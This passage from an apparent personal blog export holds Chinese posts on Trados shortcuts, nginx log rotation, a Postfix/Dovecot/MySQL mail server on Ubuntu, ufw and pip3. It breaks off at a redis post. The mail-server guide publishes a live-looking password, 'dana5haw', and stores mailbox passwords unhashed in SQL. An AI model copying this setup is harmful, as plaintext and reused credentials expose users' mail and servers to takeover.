<h2 id="整体步骤"><a href="#整体步骤" class="headerlink" title="整体步骤"></a>整体步骤</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/51f3c53a2cfcdccd3822a330e89a8653.png" alt="51f3c53a2cfcdccd3822a330e89a8653.png"></p>
<h2 id="预览窗口"><a href="#预览窗口" class="headerlink" title="预览窗口"></a>预览窗口</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imageba9b8a63a24ca6b5.png" alt="imageba9b8a63a24ca6b5.png"></p>
<h2 id="翻译确认"><a href="#翻译确认" class="headerlink" title="翻译确认"></a>翻译确认</h2><p>ctrl + enter</p>
<h2 id="翻译记忆功能"><a href="#翻译记忆功能" class="headerlink" title="翻译记忆功能"></a>翻译记忆功能</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagec955ae3a8beb4480.png" alt="imagec955ae3a8beb4480.png"></p>
<h2 id="非译元素"><a href="#非译元素" class="headerlink" title="非译元素"></a>非译元素</h2><p>蓝色下划线为非译元素，包括数字、日期、测量单位、标记等。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image7c6b03eaa8b3b190.png" alt="image7c6b03eaa8b3b190.png"></p>
<h2 id="匹配率"><a href="#匹配率" class="headerlink" title="匹配率"></a>匹配率</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagead08097642a40615.png" alt="imagead08097642a40615.png"></p>
<h2 id="译文格式修改"><a href="#译文格式修改" class="headerlink" title="译文格式修改"></a>译文格式修改</h2><p>使用快捷键<code>alt + ctrl + 向下箭头</code>，可显示原文的格式，在译文应用相应格式。快捷键<code>ctrl + ,</code>也能实现同样效果<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image714fc905799b0f61.png" alt="image714fc905799b0f61.png"><br>还可以将光标指向将应用格式的译文位置，点击原文的相应格式，即可将原文格式快速应用到译文。类似于word的格式刷功能。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image06bc82b495260292.png" alt="image06bc82b495260292.png"></p>
<h2 id="实时验证"><a href="#实时验证" class="headerlink" title="实时验证"></a>实时验证</h2><p>每一次按<code>ctrl + enter</code>确认译文之后，trados都会实时验证，如果译文有错误，将会显示错误提示信息。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagea14249bbda191368.png" alt="imagea14249bbda191368.png"></p>
<h2 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h2><p>标记是紫色，表示原文的格式信息，如果原文的标记过多，可以先把原文复制到译文，再进行翻译。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagec74facec235c3d75.png" alt="imagec74facec235c3d75.png"></p>
<h2 id="翻译完成后，按F8进行验证"><a href="#翻译完成后，按F8进行验证" class="headerlink" title="翻译完成后，按F8进行验证"></a>翻译完成后，按F8进行验证</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagedd654a7bb5bf294e.png" alt="imagedd654a7bb5bf294e.png"></p>
<h2 id="按-ctrl-S-保存文件"><a href="#按-ctrl-S-保存文件" class="headerlink" title="按 ctrl + S 保存文件"></a>按 ctrl + S 保存文件</h2><h2 id="生成目标翻译"><a href="#生成目标翻译" class="headerlink" title="生成目标翻译"></a>生成目标翻译</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image146748b8eb41f83f.png" alt="image146748b8eb41f83f.png"><br>生成的译文在zh-CN文件夹<br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagecb0524e0a769c4a3.png" alt="imagecb0524e0a769c4a3.png"></p>
]]></content>
      <categories>
        <category>trados</category>
      </categories>
      <tags>
        <tag>trados</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu18.04用apt安装的nginx默认切割日志</title>
    <url>//posts/ZH-CN/Ubuntu18.04_Apt_Nginx_Log.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只是查看一下访问日志，无意发现ubuntu18.04用apt安装的nginx1.14默认就设置了日志切割。本来还有点担心日志多了会影响vps的性能。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="日志切割"><a href="#日志切割" class="headerlink" title="日志切割"></a>日志切割</h2><p>Nginx自带了日志切割的设置：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0dqvj6x6j30nz03sglw.jpg" alt="image.png"><br>日志切割相关的配置：<code>/etc/logrotate.d/nginx</code><br>这个脚本的意思是每天切割，保存最近14天的日志。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0e3kes56j30r30clgmi.jpg" alt="image.png"><br>根据<code>/etc/crontab</code>文件内容，可以查出每天切割日志的时间是6:25。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0ecxdmfij30tm09m75c.jpg" alt="image.png"></p>
<h2 id="又发现了互联网的扫描"><a href="#又发现了互联网的扫描" class="headerlink" title="又发现了互联网的扫描"></a>又发现了互联网的扫描</h2><p>日志显示攻击者用的是zgrab工具。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0ducy3jjj30zo0fgwif.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://yq.aliyun.com/articles/43303">对于nginx日志切割的讲解</a></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>ubuntu18.04</tag>
        <tag>日志切割</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu18.04自建邮件服务器</title>
    <url>//posts/ZH-CN/ubuntu18.04-mailserver-diy.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在freenom新申请了一个顶级域名（一年的免费使用时间），恰好申请到<code>.ml</code>后缀的，就理解为mail的缩写好咯……我打算用这个域名建一个邮件服务系统。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装mysql并配置"><a href="#安装mysql并配置" class="headerlink" title="安装mysql并配置"></a>安装mysql并配置</h3><p>安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install mysql-server</span><br></pre></td></tr></table></figure>
<p>登录至mysql：（root默认无密码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<p>创建数据库：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database mailserver <span class="type">character</span> <span class="keyword">set</span> utf8;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> mailserver@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;dana5haw&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> mailserver.<span class="operator">*</span> <span class="keyword">to</span> mailserver@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;dana5haw&#x27;</span>;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>
<p>登录mailserver用户，创建数据表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u mailserver -p</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use mailserver;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `virtual_domains` (  </span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> auto_increment,  </span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`))  </span><br><span class="line">  ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `virtual_users` (  </span><br><span class="line">`id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> auto_increment,  </span><br><span class="line">`domain_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">`password` <span class="type">varchar</span>(<span class="number">106</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">`email` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`),  </span><br><span class="line"><span class="keyword">UNIQUE</span> KEY `email` (`email`),  </span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (domain_id) <span class="keyword">REFERENCES</span> virtual_domains(id) <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE)  </span><br><span class="line">ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `virtual_aliases` (  </span><br><span class="line">`id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> auto_increment,  </span><br><span class="line">`domain_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">`source` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">`destination` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`),  </span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (domain_id) <span class="keyword">REFERENCES</span> virtual_domains(id) <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE)  </span><br><span class="line">ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure>
<p>插入数据到数据表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_domains(id,name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;mail.xiaokunjia.ml&#x27;</span>);     </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_domains(id,name) <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;xiaokunjia.ml&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_users(id,domain_id,password,email) <span class="keyword">values</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;dana5haw&#x27;</span>,<span class="string">&#x27;dana@xiaokunjia.ml&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_users(id,domain_id,password,email) <span class="keyword">values</span> (<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;dana5haw&#x27;</span>,<span class="string">&#x27;shaw@xiaokunjia.ml&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_aliases(id,domain_id,source,destination)  </span><br><span class="line"><span class="keyword">values</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;all@xiaokunjia.ml&#x27;</span>,<span class="string">&#x27;dana@xiaokunjia.ml&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> virtual_aliases(id,domain_id,source,destination)  </span><br><span class="line"><span class="keyword">values</span> (<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;all@xiaokunjia.ml&#x27;</span>,<span class="string">&#x27;shaw@xiaokunjia.ml&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>测试插入数据是否成功：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> virtual_domains;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> virtual_users;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> virtual_aliases;</span><br></pre></td></tr></table></figure>
<p>申请https证书：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certbot certonly --manual --preferred-challenge dns -d mail.xiaokunjia.ml</span><br></pre></td></tr></table></figure>
<h3 id="安装postfix并配置"><a href="#安装postfix并配置" class="headerlink" title="安装postfix并配置"></a>安装postfix并配置</h3><p>安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install postfix postfix-mysql</span><br></pre></td></tr></table></figure>
<p>备份原配置文件<code>/etc/postfix/main.cf</code>之后，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/postfix/main.cf /etc/postfix/main.cf.bak</span><br></pre></td></tr></table></figure>
<p>修改配置文件：<br><a href="https://v2ray.dana5haw.com:8008/image/gdpU"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image96c870a39ace11e1.png" alt="image96c870a39ace11e1.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/g5E8"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imageb851413a64f7fdf7.png" alt="imageb851413a64f7fdf7.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gPZZ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagea08d2dae9001c479.png" alt="imagea08d2dae9001c479.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gQni"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagef8abfe481ffc8277.png" alt="imagef8abfe481ffc8277.png"></a><br>新增配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# vi /etc/postfix/mysql-virtual-mailbox-domains.cf</span><br></pre></td></tr></table></figure>
<p>配置文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user = mailserver</span><br><span class="line">password = dana5haw</span><br><span class="line">hosts = 127.0.0.1</span><br><span class="line">dbname = mailserver</span><br><span class="line">query = SELECT 1 FROM virtual_domains WHERE name=&#x27;%s&#x27;</span><br></pre></td></tr></table></figure>
<p>重启postfix服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# service postfix restart</span><br></pre></td></tr></table></figure>
<p>测试配置文件是否正确：（输出结果为1，表示配置文件正确）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># postmap -q xiaokunjia.ml mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>新增配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# vi /etc/postfix/mysql-virtual-mailbox-maps.cf</span><br></pre></td></tr></table></figure>
<p>配置文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user = mailserver</span><br><span class="line">password = dana5haw</span><br><span class="line">hosts = 127.0.0.1</span><br><span class="line">dbname = mailserver</span><br><span class="line">query = SELECT 1 FROM virtual_users WHERE email=&#x27;%s&#x27;</span><br></pre></td></tr></table></figure>
<p>重启postfix服务，测试配置文件是否正确：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# service postfix restart</span><br><span class="line">root@vultr:~# postmap -q dana@xiaokunjia.ml mysql:/etc/postfix/mysql-virtual-mailbox-maps.cf</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>新增配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# vi /etc/postfix/mysql-virtual-alias-maps.cf</span><br></pre></td></tr></table></figure>
<p>配置文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user = mailserver</span><br><span class="line">password = dana5haw</span><br><span class="line">hosts = 127.0.0.1</span><br><span class="line">dbname = mailserver</span><br><span class="line">query = SELECT destination FROM virtual_aliases WHERE source=&#x27;%s&#x27;</span><br></pre></td></tr></table></figure>
<p>重启postfix服务，测试配置文件是否正确：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# service postfix restart</span><br><span class="line">root@vultr:~# postmap -q all@xiaokunjia.ml mysql:/etc/postfix/mysql-virtual-alias-maps.cf</span><br><span class="line">dana@xiaokunjia.ml,shaw@xiaokunjia.ml</span><br></pre></td></tr></table></figure>
<p>备份配置文件<code>/etc/postfix/master.cf</code>之后，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/postfix/master.cf /etc/postfix/master.cf.bak</span><br></pre></td></tr></table></figure>
<p>修改配置文件内容：<br><a href="https://v2ray.dana5haw.com:8008/image/gRFn"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image150e0bbeed21267d.png" alt="image150e0bbeed21267d.png"></a><br>重启postfix服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# service postfix restart </span><br></pre></td></tr></table></figure>
<h3 id="安装Dovecot并配置"><a href="#安装Dovecot并配置" class="headerlink" title="安装Dovecot并配置"></a>安装Dovecot并配置</h3><p>安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install dovecot-core dovecot-imapd dovecot-pop3d dovecot-lmtpd dovecot-mysql</span><br></pre></td></tr></table></figure>
<p>修改配置文件<code>/etc/dovecot/dovecot.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/dovecot.conf /etc/dovecot/dovecot.conf.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/g9HV"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagea69d69106b434122.png" alt="imagea69d69106b434122.png"></a><br>修改配置文件<code>/etc/dovecot/conf.d/10-mail.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/conf.d/10-mail.conf /etc/dovecot/conf.d/10-mail.conf.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/gt2A"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image663c00de1025865d.png" alt="image663c00de1025865d.png"></a><br>检查<code>/var/mail</code>的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# ls -ld /var/mail</span><br><span class="line">drwxrwsr-x 2 root mail 4096 Feb  3 18:22 /var/mail</span><br></pre></td></tr></table></figure>
<p>创建文件夹：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# mkdir -p /var/mail/vhosts/xiaokunjia.ml</span><br></pre></td></tr></table></figure>
<p>新建vmail用户组并修改<code>/var/mail</code>的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# groupadd -g 5000 vmail</span><br><span class="line">root@vultr:~# useradd -g vmail -u 5000 vmail -d /var/mail</span><br><span class="line">root@vultr:~# chown -R vmail:vmail /var/mail</span><br></pre></td></tr></table></figure>
<p>修改配置文件<code>/etc/dovecot/conf.d/10-auth.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/conf.d/10-auth.conf /etc/dovecot/conf.d/10-auth.conf.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xV59"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image76858b32b99deb51.png" alt="image76858b32b99deb51.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xx3O"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image8664f29d795d982b.png" alt="image8664f29d795d982b.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/x146"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image5bd7d21edc97a9c3.png" alt="image5bd7d21edc97a9c3.png"></a><br>修改配置文件<code>/etc/dovecot/conf.d/auth-sql.conf.ext</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/conf.d/auth-sql.conf.ext /etc/dovecot/conf.d/auth-sql.conf.ext.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xZEL"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image817f679b76d9dae7.png" alt="image817f679b76d9dae7.png"></a><br>修改配置文件<code>/etc/dovecot/dovecot-sql.conf.ext</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/dovecot-sql.conf.ext /etc/dovecot/dovecot-sql.conf.ext.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xhZe"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image0354ff625a0a3636.png" alt="image0354ff625a0a3636.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xkv3"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image514ada480d2a125b.png" alt="image514ada480d2a125b.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xlFB"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image4c9c8aca7bfc34dc.png" alt="image4c9c8aca7bfc34dc.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xoHp"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image1c15171fa6395599.png" alt="image1c15171fa6395599.png"></a><br>修改目录权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# chown -R vmail:dovecot /etc/dovecot</span><br><span class="line">root@vultr:~# chmod -R o-rwx /etc/dovecot</span><br></pre></td></tr></table></figure>
<p>修改配置文件<code>/etc/dovecot/conf.d/10-master.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/conf.d/10-master.conf /etc/dovecot/conf.d/10-master.conf.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xNwh"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagea20ec47b88fca2ce.png" alt="imagea20ec47b88fca2ce.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xc27"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image4e9687811f105179.png" alt="image4e9687811f105179.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/x0LY"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagebfca00ca7cd7a7b0.png" alt="imagebfca00ca7cd7a7b0.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xJNx"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image0d518babe9e18595.png" alt="image0d518babe9e18595.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xj4S"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagefa2838c1502bea54.png" alt="imagefa2838c1502bea54.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xwUG"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image7e8916c4d34b7247.png" alt="image7e8916c4d34b7247.png"></a><br>修改配置文件<code>/etc/dovecot/conf.d/10-ssl.conf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# cp /etc/dovecot/conf.d/10-ssl.conf /etc/dovecot/conf.d/10-ssl.conf.bak</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/xCZH"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imagedffa5da9c1693a03.png" alt="imagedffa5da9c1693a03.png"></a><br>重启devecot：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# service dovecot restart</span><br></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>用foxmail进行测试，测试失败了。</p>
<ul>
<li>修改FQDN为邮件域名<br>参考<a href="https://linzyjx.com/archives/49.html">文章</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# hostnamectl set-hostname mail.xiaokunjia.ml</span><br><span class="line">root@vultr:~# hostnamectl</span><br><span class="line">   Static hostname: mail.xiaokunjia.ml</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: 略</span><br><span class="line">        Machine ID: 略</span><br><span class="line">           Boot ID: 略</span><br><span class="line">    Virtualization: 略</span><br><span class="line">  Operating System: Ubuntu 18.04.4 LTS</span><br><span class="line">            Kernel: Linux 4.15.0-88-generic</span><br><span class="line">      Architecture: x86-64</span><br></pre></td></tr></table></figure>
修改<code>/etc/hosts</code>文件的回环地址解析，替换掉原本的主机名。<br><a href="https://v2ray.dana5haw.com:8008/image/xGvf"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imageb01eda0ff9eabb62.png" alt="imageb01eda0ff9eabb62.png"></a><br><del>总算是搭建完了一个私人邮局……<br>明天再整理一下这个过程</del><br>foxmail配置信息：<br><a href="https://v2ray.dana5haw.com:8008/image/xzOc"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/07/image0a7388bfc4d3d950.png" alt="image0a7388bfc4d3d950.png"></a><br>因为只有收件服务器用了ssl，发件服务器没有配置ssl。<br>主要参考<a href="https://blog.jsjs.org/?p=231">这篇文章</a>操作的。</li>
</ul>
]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>ubuntu18.04</tag>
        <tag>自建邮件服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu修改root密码</title>
    <url>//posts/ZH-CN/Ubuntu_Root_Modify.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装ubuntu的时候没有设置root用户的密码，现在需要设置root密码。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dana@dana:~$ sudo passwd root</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/wy_97/article/details/78294562">https://blog.csdn.net/wy_97/article/details/78294562</a></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>修改root密码</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu命令学习-防火墙ufw</title>
    <url>//posts/ZH-CN/Ubuntu_Ufw.html</url>
    <content><![CDATA[<h2 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h2><p><code>sudo ufw status</code></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ufw disable #关闭防火墙</span><br><span class="line">sudo ufw enable #打开防火墙</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/JingLisen/article/details/102000039">https://blog.csdn.net/JingLisen/article/details/102000039</a></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu命令学习</tag>
        <tag>防火墙ufw</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu机器安装pip3</title>
    <url>//posts/ZH-CN/ubuntu_Install_Pip3.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我装的ubuntu机器自带了Python3，但是没有安装pip3，不方便安装第三方模块。于是需要安装pip3。<br><escape> <span id="more"></span></escape></p>
<h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# apt-get install python3-pip #安装python3-pip</span><br></pre></td></tr></table></figure>
<h2 id="查看安装是否成功"><a href="#查看安装是否成功" class="headerlink" title="查看安装是否成功"></a>查看安装是否成功</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# pip3 --version #查看pip3的版本</span><br><span class="line">pip 18.1 from /usr/lib/python3/dist-packages/pip (python 3.7)</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/keith_bb/article/details/65435337">https://blog.csdn.net/keith_bb/article/details/65435337</a></p>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>安装pip3</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-ubuntu机器的redis进程杀不完怎么办</title>
    <url>//posts/ZH-CN/TroubleShoot_Ubuntu_Redis_Process.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>重启redis-server发现这样一个问题，尝试查找redis进程id（ps -ef|grep redis），用<code>kill -9 进程id</code>杀死redis服务进程，未果。进程杀不完，杀了一个又来一个🙃🙃🙃🙃</p>
